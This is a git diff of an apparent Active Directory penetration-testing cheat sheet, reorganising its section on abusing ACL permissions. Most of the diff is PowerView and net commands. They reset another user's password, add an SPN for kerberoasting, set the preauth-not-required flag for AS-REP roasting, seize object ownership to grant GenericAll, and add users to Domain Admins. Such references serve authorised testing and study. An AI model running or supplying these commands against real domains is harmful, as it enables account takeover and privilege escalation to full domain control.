@@ -5,8 +5,8 @@
 * [Access Control List(ACL)](#Access-Control-List)
   * [Check specific ACL permissions](#Specific-ACL-permissions)
   * [ACL-abuses](#ACL-abuses)
-    * [Generic all on user](#Generic-all-on-user)
-    * [GenericAll permission on a Group](#GenericAll-permission-on-a-Group,-Write-permission,-Write-Owner-permission-or-Self-permission)
+    * [Permissions on a user](#Permissions-on-a-user)
+    * [Permissions on a group](#Permissions-on-a-group)
     * [Writedacl on Domain Object](#Writedacl-on-Domain-Object)
     * [With GenericAll Over a Domain Object](#With-GenericAll-Over-a-Domain-Object)
     * [With GenericAll Over an OU](#With-GenericAll-Over-an-OU)
@@ -215,7 +215,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"} | select-obj
 ```
 
 #### Scan for all ACL permissions of the user has on another object
-- First get the SID of the user you want the permissions from
+- First get the SID of the user you want to check if he has permissions on target user
 ```
 Get-Domainuser <USERNAME>
 Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
@@ -232,8 +232,9 @@ Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdenti
 
 - In case you have WriteOwner permissions you can add a owner to the object.
 
-### Generic all on user
-#### Reset password of a user
+### Permissions on a user
+
+#### Generic all / Force Change Password / AllExtendedRights - Reset password of a user
 ```
 net user <USERNAME> <PASSWORD> /domain
 
@@ -241,31 +242,42 @@ $UserPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $UserPassword
 ```
 
-#### Set SPN for user
+#### Generic write - Set SPN for user
 - For example service ```HTTP/jumpbox```
 - Then kerberoast the user [Kerberoast](#Kerberoast) 
+- Execute command again to revert it
 ```
-setspn.exe -a <SERVICE>/<SPN> <DOMAIN>\<USERNAME>
-
 Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='<SERVICE>/<SPN>1'}
 ```
 
-#### Remove SPN
-```
-setspn.exe -d <SERVICE>/<SPN> <DOMAIN>\<USERNAME>
-```
-
-#### Add preauthnotreq flag
+#### Generic write - Add preauthnotreq flag
 - Then as-repreoast the user [AS-REP Roasting](#AS-REP-Roasting) 
 - Execute command again to revert it
 ```
 Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
-### GenericAll permission on a Group, Write permission, Write-Owner permission or Self permission
-#### Add user to a group
+#### Write owner - Change owner and give generic all
+- Use ```Remove-ObjectAcl``` and ```Set-DomainObjectOwner``` again to remove the ACL's
 ```
-Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
+Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <NEW OWNER> -Verbose
+Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
+
+# Check who is owner 
+Get-DomainObject -Identity <TARGET> -SecurityMasks Owner | select samaccountname, Owner
+Get-DomainObject -Identity <SID>
+
+# Check new rights - First get the SID of the user you want to check if he has permissions on target user
+Get-Domainuser <USERNAME>
+Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "<SID>"}
+```
+
+### Permissions on a group
+- GenericAll permission on a Group, Write permission, Write-Owner permission or Self permission
+
+#### Add user to a group 
+```
+Add-DomainGroupMember -Identity "<GROUP>" -Members <USER> -Verbose
 net group "Domain Admins" analyst1 /domain /add
 ```
 
